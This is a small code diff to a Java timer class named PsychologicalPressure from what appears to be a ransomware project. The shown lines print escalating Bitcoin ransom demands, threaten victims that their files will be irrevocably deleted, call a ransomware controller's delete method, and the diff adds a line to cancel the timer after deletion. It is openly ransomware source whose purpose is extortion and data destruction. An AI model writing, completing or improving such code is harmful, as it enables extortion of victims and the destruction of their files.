@@ -35,6 +35,7 @@ public class PsychologicalPressure extends TimerTask {
         } else if (counter > 4) {
             System.out.println("Payment not arrived, your files will be irrevocably deleted");
             ransomWareController.delete();
+            this.cancel();
         } else {
             System.out.println("Amount to pay increased by 0,01 to " + ransomAmount + " BTC.");
         }
